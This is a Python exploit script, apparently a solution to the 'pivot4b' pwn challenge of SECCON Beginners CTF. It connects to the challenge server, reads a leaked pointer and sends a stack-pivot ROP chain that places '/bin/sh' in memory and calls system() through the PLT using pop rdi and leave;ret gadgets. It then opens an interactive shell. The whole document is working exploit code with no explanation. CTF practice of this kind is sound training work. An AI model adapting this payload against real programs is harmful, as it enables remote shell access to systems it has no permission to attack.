from ptrlib import *

elf = ELF("./chall")
# sock = Process("./chall")
sock = Socket("nc pivot4b.challenges.beginners.seccon.jp 12300")

message = int(sock.recvlineafter("pointer to message: "), 16)
print(f"message:", hex(message))

payload = b"/bin/sh\x00"
payload += p64(next(elf.gadget("pop rdi; ret;")))
payload += p64(message)
payload += p64(next(elf.gadget("ret;")))
payload += p64(elf.plt("system"))
payload += b"A" * 0x8
payload += p64(message)
payload += p64(next(elf.gadget("leave; ret;")))

sock.sendlineafter("> ", payload)

sock.sh()
